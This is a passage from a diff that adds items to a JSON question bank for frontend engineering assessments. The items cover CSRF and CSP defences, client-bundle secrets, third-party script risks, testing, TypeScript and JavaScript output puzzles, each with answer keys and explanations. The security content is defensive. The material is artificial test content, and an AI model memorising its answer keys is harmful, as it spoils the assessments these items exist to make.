+      "The browser will not run inline scripts or scripts from other sites, so the payload is blocked",
+      "Other websites can no longer load your pages inside an iframe, which stops this attack",
+      "The browser blocks all requests from other origins to your API, so stolen data cannot be sent out"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.backend.http"
+    ],
+    "bank_key": "swe.frontend.k2.csrf-defence-not-cors",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.security.auth",
+    "prompt": "Your app's session cookie is set with `SameSite=None; Secure`, because the app must also work inside a partner's website in an iframe. The endpoint `POST /api/transfer` moves money. Which defence stops other websites from forging this request?",
+    "explanation": "Correct: with `SameSite=None` the browser attaches the cookie to requests started by any site, so the server needs proof that the request came from your own page. A CSRF token that your page reads and sends back gives that proof, because other sites cannot read your pages to learn it (checking the `Origin` header is a useful extra check). Wrong (rely on CORS): CORS only decides whether the other site's script may read the response; a cross-site form post or simple request is still sent with the cookie, and the transfer still happens. Wrong (HttpOnly): it stops scripts reading the cookie, but the browser still attaches it to forged requests. Wrong (POST only): another site can submit a hidden form with `method=\"post\"` to your API.",
+    "expected_time_s": 55,
+    "choices": [
+      "Require a CSRF token that your page sends in a header and the server checks on every change",
+      "Rely on CORS: since the API does not allow other origins, their requests never reach your server",
+      "Mark the session cookie `HttpOnly`, so that other sites are unable to use it in their own requests",
+      "Accept only POST for changes, because other sites can only send GET requests to your API"
+    ],
+    "answer": {
+      "correct": 0
+    },
+    "group": "token-storage"
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.browser_network"
+    ],
+    "bank_key": "swe.frontend.k2.secret-in-bundle",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.security.data_protection",
+    "prompt": "A React app calls a paid third-party API directly from the browser. The secret API key is stored in `.env` as `VITE_PAYMENTS_SECRET` and read in the app's code with `import.meta.env.VITE_PAYMENTS_SECRET`. The `.env` file is listed in `.gitignore`. Is the key safe?",
+    "explanation": "Correct: values the client code reads from `import.meta.env` (and similar `REACT_APP_` or `NEXT_PUBLIC_` variables) are written into the bundle as plain strings at build time, and the key is also visible in every request the browser sends. The browser should call your own server, which holds the key and calls the third-party API. Wrong (.gitignore): it keeps the file out of Git, not out of the built JavaScript. Wrong (minified): minifying renames variables but leaves string values as they are. Wrong (only source maps): the key is in the minified code itself, so removing source maps changes nothing.",
+    "expected_time_s": 45,
+    "choices": [
+      "Yes, as long as the production bundle is minified, which makes the key very hard to find",
+      "Yes: `.env` is in `.gitignore`, so the value never leaves the machines that build the app",
+      "No: the build copies the value into the JavaScript every visitor downloads; keep it on a server",
+      "No, but only because of source maps; turning them off in production keeps the key hidden"
+    ],
+    "answer": {
+      "correct": 2
+    },
+    "group": "frontend-secret"
+  },
+  {
+    "type": "multi_select",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.browser_network"
+    ],
+    "bank_key": "swe.frontend.k2.third-party-script-risks",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.security.data_protection",
+    "prompt": "Marketing wants a third-party chat widget on every page, including checkout, added with `<script src=\"https://widget.vendor.example/chat.js\"></script>`. Which of these are real risks of doing this? Select all that apply.",
+    "choices": [
+      "The script runs with full access to the page, so it can read what users type into the card form",
+      "If the vendor's server is hacked, the attacker's code runs on your site for every visitor",
+      "The script can read your server's environment variables, such as the database password",
+      "The script can read cookies marked HttpOnly and send them to the vendor's own server",
+      "If the vendor's server is slow or down, it can delay or break the loading of your page"
+    ],
+    "explanation": "Correct (full page access): a script included this way runs with the same rights as your own code, so it can read form fields, including card details. Correct (vendor compromise): you run whatever that URL serves at the moment, so a hacked vendor means hacked checkout pages (keep such scripts off payment pages, pin versions with Subresource Integrity where possible, and limit sources with CSP). Correct (slow or down vendor): a blocking script in the page waits for the vendor's server, and its errors can break your page. Wrong (server environment variables): code in the browser cannot reach your server's environment. Wrong (HttpOnly cookies): no page script, yours or theirs, can read HttpOnly cookies.",
+    "expected_time_s": 60,
+    "answer": {
+      "correct": [
+        0,
+        1,
+        4
+      ]
+    },
+    "group": "third-party-script"
+  },
+  {
+    "type": "multi_select",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.security.auth"
+    ],
+    "bank_key": "swe.frontend.k2.what-users-can-see",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.security.data_protection",
+    "prompt": "Which of these can any signed-in user of your public web app see, using only the browser's developer tools? Select all that apply.",
+    "choices": [
+      "Environment variables on the API server that the client-side code never references",
+      "Every field in the API's JSON responses to them, including fields the UI never shows",
+      "Your original, unminified source code, if source map files are published with the site",
+      "Records that the API returns only to admins, after it checks the caller's role",
+      "The code of admin-only screens, if it is bundled into the JavaScript every user loads"
+    ],
+    "explanation": "Rule: anything sent to the browser is visible to its user. Correct (hidden JSON fields): the network tab shows the full response, so the API should only send fields the user may see. Correct (published source maps): they rebuild the original files, comments included. Correct (bundled admin code): code in the bundle can be read by anyone who loads it; this is fine only if the API, not the hidden screen, enforces who may do what. Wrong (server environment variables): they never reach the browser unless code sends them. Wrong (admin-only records): if the server checks the role, these records are never sent to a normal user.",
+    "expected_time_s": 60,
+    "answer": {
+      "correct": [
+        1,
+        2,
+        4
+      ]
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.accessibility"
+    ],
+    "bank_key": "swe.frontend.k2.query-by-role",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.craft.testing",
+    "prompt": "In a component test written with Testing Library, which way of finding the form's Submit button follows the library's guidance best, and also checks that the button is accessible?",
+    "explanation": "Correct: `getByRole` finds elements the way users and assistive technology do, by role and accessible name, so the test fails if the button becomes a div or loses its name, and it survives changes to classes and markup. Wrong (querySelector on a class): it ties the test to CSS class names that users never see and that change during refactors. Wrong (getByTestId): an escape hatch for when nothing else works; it checks nothing about what users see or hear. Wrong (getByText): it finds the text, but a div that says \"Submit\" would pass even though it is not a working button.",
+    "expected_time_s": 45,
+    "choices": [
+      "`screen.getByRole('button', { name: 'Submit' })`",
+      "`container.querySelector('.btn-primary')`",
+      "`screen.getByTestId('submit-button')`",
+      "`screen.getByText('Submit')`"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.browser_network"
+    ],
+    "bank_key": "swe.frontend.k2.mock-network-layer",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.craft.testing",
+    "prompt": "You are writing component tests for `<OrderHistory>`. It fetches `/api/orders` and shows a loading state, then either the list of orders or an error message. How should the tests control the data?",
+    "explanation": "Correct: mocking at the network boundary keeps the component's real fetching, loading and error code in the test, while the data stays fixed and failures or slow responses are easy to simulate. Wrong (real staging API): slow, breaks when staging is down or its data changes, and makes the error state hard to trigger. Wrong (mock the useOrders hook): it skips the code that builds the request and handles loading and errors, so a wrong URL or a broken error path would still pass. Wrong (testMode prop): it adds a code path that only tests use, so the tests no longer check what users actually run.",
+    "expected_time_s": 50,
+    "choices": [
+      "Call the real staging API, so that the tests always see realistic and up-to-date order data",
+      "Intercept the HTTP request (for example with Mock Service Worker) and return fixed data or an error",
+      "Mock the component's own `useOrders` hook, so that it returns the list directly with no request",
+      "Add a `testMode` prop to the component that skips the fetch and shows built-in sample orders"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.programming.javascript"
+    ],
+    "bank_key": "swe.frontend.k2.flaky-e2e-fixed-wait",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.craft.testing",
+    "prompt": "A search box waits until the user has stopped typing for 300 ms, then calls the API. You are writing a component test that must check two things: no request has been sent 299 ms after the last key press, and exactly one request has been sent at 300 ms. What is the best way to handle time in this test?",
+    "explanation": "Correct: fake timers (for example `vi.useFakeTimers()` in Vitest or `jest.useFakeTimers()` in Jest) replace the real clock, so the test moves time forward exactly and instantly; the 299 ms and 300 ms checks give the same result on every run and the test takes no real time. Wrong (real timers): the test's timer and the component's timer are only 1 ms apart, and timers can fire late on a busy machine, so the two checks are unreliable, and every such test is slow. Wrong (0 ms delay under test): a test-only code path means the 300 ms behaviour is never tested at all. Wrong (retrying assertion): it only proves that a request is sent at some point within 2 seconds; it cannot show that nothing was sent at 299 ms or that the delay is 300 ms.",
+    "expected_time_s": 55,
+    "choices": [
+      "Use real timers: in the test, wait 299 ms with `setTimeout` and check, then wait 1 ms more and check again",
+      "Set the delay to 0 ms when the code runs under test, so the test does not have to wait for anything",
+      "Use the test runner's fake timers: advance the clock by 299 ms and check, then by 1 ms more and check",
+      "Use a retrying assertion that waits up to 2 seconds until exactly one request has been sent"
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.craft.correctness"
+    ],
+    "bank_key": "swe.frontend.k2.ts-optional-property",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.programming.typescript",
+    "prompt": "This TypeScript project has `strict: true`. What does the compiler report for this code?\n\n```typescript\ntype User = { name: string; email?: string };\n\nfunction emailDomain(user: User): string {\n  return user.email.split('@')[1];\n}\n```",
+    "explanation": "Correct (checked with tsc in strict mode: error TS18048, \"'user.email' is possibly 'undefined'\"): `email?: string` means the type is `string | undefined`, and strict null checks refuse to call a method on a value that may be undefined. Fix by narrowing first (`if (!user.email) return '';`) or with `user.email?.split('@')[1] ?? ''`. Wrong (allowed because it is a string): the `?` adds `undefined` to the type. Wrong (run-time check): TypeScript removes all types when compiling and never adds run-time checks. Wrong (try/catch): there is no such rule; the error is about narrowing the type.",
+    "expected_time_s": 50,
+    "choices": [
+      "Nothing, because `email` is declared as a `string`, so calling `split` on it is allowed",
+      "An error: `user.email` is possibly `undefined`, so it must be checked before calling `split`",
+      "Nothing, because TypeScript adds a check that throws at run time if `email` is missing",
+      "An error: optional properties can only be read inside a `try`/`catch` block"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.browser_network"
+    ],
+    "bank_key": "swe.frontend.k2.env-build-time",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.tooling.containers",
+    "prompt": "A single-page app reads its API address with `import.meta.env.VITE_API_URL`. CI builds it once, with the staging settings, into a Docker image that serves the static files. The same image is deployed to staging and to production, with a different `VITE_API_URL` set in each container's environment. Production still calls the staging API. Why?",
+    "explanation": "Correct: the bundler replaces `import.meta.env.VITE_API_URL` with a fixed string while building. The files in the image already contain the staging address, and code running in a visitor's browser cannot read the container's environment anyway. Fixes: build once per environment, or load settings at run time (for example a `/config.json` written when the container starts, or a relative `/api` path). Wrong (browser cache): browsers do not have environment variables. Wrong (restart needed): a container's environment is set when it starts, but the static files never read it. Wrong (VITE_ is private): it is the opposite; Vite only exposes variables with that prefix to client code, in every build.",
+    "expected_time_s": 55,
+    "choices": [
+      "The value was copied into the JavaScript files at build time; the container's setting is never read",
+      "Browsers cache environment variables for each site, so visitors must clear their cache to see it",
+      "Container environment variables are only applied after the host server restarts, which has not happened",
+      "The `VITE_` prefix marks a variable as private, so it is only applied to development builds"
+    ],
+    "answer": {
+      "correct": 0
+    },
+    "group": "frontend-secret"
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.operations.monitoring"
+    ],
+    "bank_key": "swe.frontend.k2.source-maps-error-tracker",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.debugging.tools",
+    "prompt": "Your error tracker shows production stack traces like `at e (main.4f2a91.js:1:48213)`, which are hard to read. What is the best way to see the original file, function name and line number?",
+    "explanation": "Correct: source maps link each position in the minified bundle back to the original file, line and name, and error trackers apply them automatically; uploading them privately means they do not have to be served to the public. Wrong (no minification): larger, slower downloads for every user, and bundling still merges files, so original files and lines are still lost. Wrong (try/catch everywhere): a lot of noisy code that changes behaviour and still gives no original line numbers. Wrong (console.log and wait): slow and reactive, and the error may not happen again soon.",
+    "expected_time_s": 40,
+    "choices": [
+      "Turn off minification in production, so that function names stay readable",
+      "Generate source maps in the build and upload them to the error tracker",
+      "Wrap every function in `try`/`catch` and log its name before rethrowing",
+      "Add `console.log` calls to the failing code paths and wait for the error again"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "multi_select",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.craft.correctness"
+    ],
+    "bank_key": "swe.frontend.k2.what-strict-typescript-catches",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.programming.typescript",
+    "prompt": "Your team turns on TypeScript with `strict: true`. Which of these bugs can the compiler catch before the code runs? Select all that apply.",
+    "choices": [
+      "Reading `order.totl` when the `Order` type only has a property called `total`",
+      "The API starts sending `total` as a string, while your `Order` type says it is a number",
+      "Calling `formatPrice('12.50')` when the function is declared as `formatPrice(amount: number)`",
+      "A discount that subtracts 10 from the price when the business rule says 10 percent",
+      "Writing `const user = data as User` when `data` is actually `null` at run time",
+      "Passing `{ name: 'Ana' }` to a function whose parameter type requires `name` and `email`"
+    ],
+    "explanation": "Checked with tsc in strict mode. Correct (misspelt property): error TS2551, \"Property 'totl' does not exist\". Correct (string passed for a number): error TS2345. Correct (missing required property): error TS2345, \"Property 'email' is missing\". Wrong (API sends a string): types are removed when compiling, so data arriving at run time is never checked; that needs run-time validation (for example a schema). Wrong (10 instead of 10 percent): both are numbers, so the types are fine; only a test catches a wrong formula. Wrong (as User): `as` tells the compiler to trust you, so it reports nothing.",
+    "expected_time_s": 60,
+    "answer": {
+      "correct": [
+        0,
+        2,
+        5
+      ]
+    }
+  },
+  {
+    "type": "multi_select",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.accessibility"
+    ],
+    "bank_key": "swe.frontend.k2.assert-user-visible-behaviour",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.craft.testing",
+    "prompt": "Your team adds an automated accessibility checker (such as axe) to the end-to-end tests, which open each page in a real browser. Which of these problems can such a tool reliably find on its own? Select all that apply.",
+    "choices": [
+      "An `<img>` element that has no `alt` attribute at all",
+      "An image whose `alt` text is present but describes the wrong product",
+      "A text input that has no label and no other accessible name",
+      "A modal that does not move focus back to its opening button when it closes",
+      "Grey body text on a plain white background, at a contrast ratio of 2.5:1",
+      "A custom dropdown that opens on click but ignores the arrow keys"
+    ],
+    "explanation": "Automated checkers test the rendered page against rules a program can decide. Correct (no alt attribute): whether the attribute exists is a simple check (axe rule image-alt). Correct (input with no name): the tool computes each field's accessible name and reports an empty one (axe rule label). Correct (2.5:1 contrast on a plain background): the tool reads both colours in the real browser and computes the ratio (axe rule color-contrast; this is why the item says real browser, since jsdom-based component tests switch this rule off). Wrong (wrong alt text): the tool sees that alt text exists but cannot judge whether it describes the image. Wrong (focus not returned): this is behaviour over time, after a user action, which a static scan of the page does not exercise. Wrong (dropdown ignores arrow keys): the tool can check roles and attributes, not how the widget responds to keys. These need manual keyboard and screen reader testing; automated tools find only part of real accessibility problems.",
+    "expected_time_s": 55,
+    "answer": {
+      "correct": [
+        0,
+        2,
+        4
+      ]
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.concurrency.fundamentals"
+    ],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.promise-chain-before-timeout",
+    "difficulty": "medium",
+    "prompt": "What does this print? (Each option lists the printed lines in order, separated by commas.)\n\n```javascript\nsetTimeout(() => console.log('timeout'), 0);\nPromise.resolve()\n  .then(() => console.log('then 1'))\n  .then(() => console.log('then 2'));\nconsole.log('sync');\n```",
+    "explanation": "Correct (run on Node 24; browsers behave the same): the synchronous code runs first, so \"sync\" is first. Promise callbacks are microtasks, and a callback queued by a `.then` that runs during the microtask queue is added to that same queue, so \"then 2\" also runs before the event loop reaches any timer. Wrong (timeout between then 1 and then 2): assumes each step of a promise chain waits for the next turn of the event loop. Wrong (timeout first): assumes a 0 ms timer runs before promise callbacks. Wrong (then callbacks before sync): `.then` callbacks never run while the current script is still running.",
+    "expected_time_s": 55,
+    "choices": [
+      "sync, timeout, then 1, then 2",
+      "sync, then 1, timeout, then 2",
+      "sync, then 1, then 2, timeout",
+      "then 1, then 2, sync, timeout"
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3",
+      "L4"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.concurrency.fundamentals"
+    ],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.microtasks-between-timers",
+    "difficulty": "hard",
+    "prompt": "Both timers have the same delay. What does this print?\n\n```javascript\nconst out = [];\nsetTimeout(() => {\n  out.push('t1');\n  Promise.resolve().then(() => out.push('p1'));\n}, 0);\nsetTimeout(() => {\n  out.push('t2');\n  console.log(out.join(' '));\n}, 0);\n```",
+    "explanation": "Correct (run on Node 24; current browsers behave the same): timers with the same delay run in the order they were created. After each timer callback finishes, the microtask queue is emptied before the next timer runs, so the promise callback queued inside the first timer (p1) runs before the second timer (t2). Wrong (t1 t2 p1): assumes all due timers run together before any microtasks, which was the behaviour of very old Node versions (before Node 11). Wrong (t2 t1 p1): timers with equal delays keep their creation order. Wrong (p1 t1 t2): the promise is only created inside the first timer, so p1 cannot come first.",
+    "expected_time_s": 65,
+    "choices": [
+      "p1 t1 t2",
+      "t1 t2 p1",
+      "t2 t1 p1",
+      "t1 p1 t2"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.concurrency.fundamentals"
+    ],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.promise-all-starts-together",
+    "difficulty": "hard",
+    "prompt": "Two loaders are started for one screen. What does this print?\n\n```javascript\nconst log = [];\nasync function load(name) {\n  log.push(name + ' start');\n  await null;\n  log.push(name + ' end');\n}\nasync function main() {\n  await Promise.all([load('a'), load('b')]);\n  console.log(log.join(', '));\n}\nmain();\n```",
+    "explanation": "Correct (run on Node 24): `[load('a'), load('b')]` calls both functions before `Promise.all` even sees them. Each runs synchronously up to its `await`, so both log \"start\" first; their continuations then run in the order they paused, so \"a end\" comes before \"b end\". This is why `Promise.all` over several requests starts them all at once. Wrong (a start, a end, b start, b end): assumes `Promise.all` runs the functions one after another, or that awaiting a non-promise value does not pause. Wrong (b end before a end): microtasks run in first-in, first-out order, not last-in, first-out. Wrong (only the two starts): `main` awaits `Promise.all`, so it only logs after both functions have finished.",
+    "expected_time_s": 65,
+    "choices": [
+      "a start, b start",
+      "a start, a end, b start, b end",
+      "a start, b start, b end, a end",
+      "a start, b start, a end, b end"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.let-outside-loop",
+    "difficulty": "medium",
+    "prompt": "What does this print?\n\n```javascript\nconst callbacks = [];\nlet i;\nfor (i = 0; i < 3; i++) {\n  callbacks.push(() => i);\n}\nconsole.log(callbacks.map((cb) => cb()));\n```",
+    "explanation": "Correct (run on Node 24): `let` only creates a new variable for each iteration when it is declared in the loop head. Here `i` is declared once, outside the loop, so all three arrow functions share that one variable, which is 3 when they finally run. Writing `for (let i = 0; ...)` would print `[ 0, 1, 2 ]`. Wrong ([ 0, 1, 2 ]): assumes any `let` gives each iteration its own copy. Wrong ([ 2, 2, 2 ]): the loop only stops once `i < 3` is false, at 3. Wrong (undefined): the functions return `i` itself, which has a value.",
+    "expected_time_s": 55,
+    "choices": [
+      "[ undefined, undefined, undefined ]",
+      "[ 0, 1, 2 ]",
+      "[ 2, 2, 2 ]",
+      "[ 3, 3, 3 ]"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.craft.correctness"
+    ],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.empty-array-truthy",
+    "difficulty": "medium",
+    "prompt": "A page uses these values to decide whether to show an empty-state message. What does this print?\n\n```javascript\nconst users = [{ id: 1, role: 'admin' }, { id: 2, role: 'user' }];\nconst owners = users.filter((u) => u.role === 'owner');\nconst owner = users.find((u) => u.role === 'owner');\nconsole.log(owners, owner, Boolean(owners), Boolean(owner));\n```",
+    "explanation": "Correct (run on Node 24): `filter` always returns an array, an empty one when nothing matches, and every array is truthy in JavaScript, even an empty one. So `if (owners)` is always true and an empty state would never show; check `owners.length === 0` instead. `find` returns `undefined` when nothing matches, which is falsy. Wrong ([] undefined false false): assumes an empty array is falsy, as it is in some other languages. Wrong ([] null ...): `find` returns `undefined`, not `null` (DOM methods such as `querySelector` are the ones that return `null`). Wrong (undefined undefined ...): `filter` never returns `undefined`.",
+    "expected_time_s": 50,
+    "choices": [
+      "[] null true false",
+      "[] undefined false false",
+      "[] undefined true false",
+      "undefined undefined false false"
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.this-in-function-callback",
+    "difficulty": "medium",
+    "prompt": "What does this print?\n\n```javascript\nclass Basket {\n  constructor() { this.total = 0; }\n  addAll(prices) {\n    prices.forEach(function (p) { this.total += p; });\n  }\n}\nconst basket = new Basket();\ntry {\n  basket.addAll([5, 10]);\n  console.log(basket.total);\n} catch (err) {\n  console.log(err.constructor.name);\n}\n```",
+    "explanation": "Correct (run on Node 24): `forEach` calls the `function` callback without an object, and code in a class body is always in strict mode, so `this` inside the callback is `undefined`. Reading `this.total` throws a TypeError, which the catch prints. An arrow function callback would keep the method's `this` and print 15. Wrong (15): assumes a regular function callback keeps the outer `this`; only arrow functions do. Wrong (0) and Wrong (NaN): these assume the callback quietly writes to some other object, as old non-strict code did with the global object; class code is strict, so it throws instead.",
+    "expected_time_s": 55,
+    "choices": [
+      "NaN",
+      "15",
+      "0",
+      "TypeError"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.splice-mutates",
+    "difficulty": "easy",
+    "prompt": "What does this print?\n\n```javascript\nconst tabs = ['home', 'search', 'cart', 'profile'];\nconst removed = tabs.splice(1, 2);\nconsole.log(tabs, removed);\n```",
+    "explanation": "Correct (run on Node 24): `splice(1, 2)` removes 2 items starting at index 1 from `tabs` itself and returns the removed items. Wrong (tabs unchanged, removed is search and cart): treats `splice` like `slice`, which copies and leaves the array alone. Wrong (tabs unchanged, only search): reads the arguments the way `slice(1, 2)` does, as start and end. Wrong (swapped): mixes up what is kept and what is returned.",
+    "expected_time_s": 45,
+    "choices": [
+      "[ 'home', 'search', 'cart', 'profile' ] [ 'search' ]",
+      "[ 'home', 'search', 'cart', 'profile' ] [ 'search', 'cart' ]",
+      "[ 'home', 'profile' ] [ 'search', 'cart' ]",
+      "[ 'search', 'cart' ] [ 'home', 'profile' ]"
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.map-braces-no-return",
+    "difficulty": "easy",
+    "prompt": "What does this print?\n\n```javascript\nconst prices = [10, 20];\nconst doubled = prices.map((p) => { p * 2; });\nconst result = prices.forEach((p) => p * 2);\nconsole.log(doubled, result);\n```",
+    "explanation": "Correct (run on Node 24): with curly braces, an arrow function's body is a block and needs an explicit `return`; without one, each call returns `undefined`, so `map` builds an array of `undefined`. `forEach` always returns `undefined`, whatever the callback returns. Wrong ([ 20, 40 ] undefined): assumes `{ p * 2; }` returns its value, as `(p) => p * 2` would. Wrong ([ 20, 40 ] [ 20, 40 ]): also assumes `forEach` returns a new array. Wrong ([ undefined, undefined ] [ 20, 40 ]): `forEach` never returns an array.",
+    "expected_time_s": 45,
+    "choices": [
+      "[ undefined, undefined ] undefined",
+      "[ 20, 40 ] undefined",
+      "[ 20, 40 ] [ 20, 40 ]",
+      "[ undefined, undefined ] [ 20, 40 ]"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state"
+    ],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.spread-shallow-copy",
+    "difficulty": "easy",
+    "prompt": "A form edits a copy of the user so that the original stays unchanged until Save. What does this print?\n\n```javascript\nconst user = { name: 'Ana', prefs: { theme: 'light' } };\nconst draft = { ...user };\ndraft.name = 'Bo';\ndraft.prefs.theme = 'dark';\nconsole.log(user.name, user.prefs.theme);\n```",
+    "explanation": "Correct (run on Node 24): spread makes a shallow copy. `draft.name` is the copy's own property, so changing it leaves `user.name` as \"Ana\". But `draft.prefs` and `user.prefs` are the same object, so setting the theme changes the original too. Copy nested objects as well, for example `{ ...user, prefs: { ...user.prefs } }` or `structuredClone(user)`. Wrong (Ana light): assumes spread copies nested objects too. Wrong (Bo dark) and Wrong (Bo light): assume the copy shares the top-level properties with the original, but they are separate.",
+    "expected_time_s": 45,
+    "choices": [
+      "Ana dark",
+      "Ana light",
+      "Bo dark",
+      "Bo light"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state"
+    ],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.object-equality-reference",
+    "difficulty": "medium",
+    "prompt": "A shop keeps the product the user selected, then receives the same product again in a new API response. What does this print?\n\n```javascript\nconst selected = { id: 7, name: 'Lamp' };\nconst fresh = { id: 7, name: 'Lamp' }; // same product from a new API response\nconst cart = [selected];\nconsole.log(\n  selected === fresh,\n  cart.includes(fresh),\n  cart.some((p) => p.id === fresh.id)\n);\n```",
